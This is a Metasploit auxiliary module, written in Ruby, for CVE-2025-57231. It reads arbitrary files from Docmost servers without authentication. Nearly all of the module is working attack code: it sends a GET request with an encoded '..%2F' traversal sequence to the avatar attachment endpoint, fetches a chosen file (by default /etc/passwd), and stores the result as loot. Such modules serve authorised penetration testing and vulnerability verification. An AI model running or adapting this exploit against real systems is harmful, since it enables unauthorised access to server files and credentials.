##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  require 'uri'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Docmost Arbitrary File Read (CVE-2025-57231)',
        'Description' => %q{
          This module exploits an arbitrary file read vulnerability in Docmost versions from 0.2.1 to 0.21.0.
          Docmost does not validate file paths sent to the /api/attachments/img/avatar endpoint. This endpoint is publicly accessible without any authentication.
          This allows unauthenticated attackers to access the vulnerable endpoint directly and read arbitrary files on the server.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Balachandar Gowrisankar'
        ],
        'References' => [
          ['CVE', '2025-57231'],
          ['GHSA', '59m3-fj8c-996g'],
          ['URL', 'https://www.artresilia.com/docmost-v0-21-0-cve-2025-57231-unauthenticated-file-path-traversal']
        ],
        'DisclosureDate' => '2025-07-28',
        'Notes' => {
          'Reliability' => [REPEATABLE_SESSION],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('FILEPATH', [false, 'Name of the file to download', '/etc/passwd']),
        OptString.new('TARGETURI', [true, 'Base path to Docmost installation', '/'])
      ]
    )
  end

  def run
    # Check if filename is specified
    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
      print_error('Please supply the name of the file you want to download')
      return
    end

    # URL encode file path
    filepath = URI.encode_www_form_component(datastore['FILEPATH'])

    # Create request
    route = normalize_uri(
      datastore['TARGETURI'],
      'api',
      'attachments',
      'img',
      'avatar'
    )
    route += "/..%2F..%2F..%2F..%2F..#{filepath}"

    res = send_request_raw({
      'method' => 'GET',
      'uri' => route
    })

    unless res
      fail_with(Failure::Unreachable, 'The target seems to be offline')
    end
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP status: #{res.code} while attempting to read file")
    end

    fname = File.basename(datastore['FILEPATH'])

    path = store_loot(
      'docmost.http',
      'application/octet-stream',
      datastore['RHOST'],
      res.body,
      fname
    )
    print_status("File saved to: #{path}")
  end
end
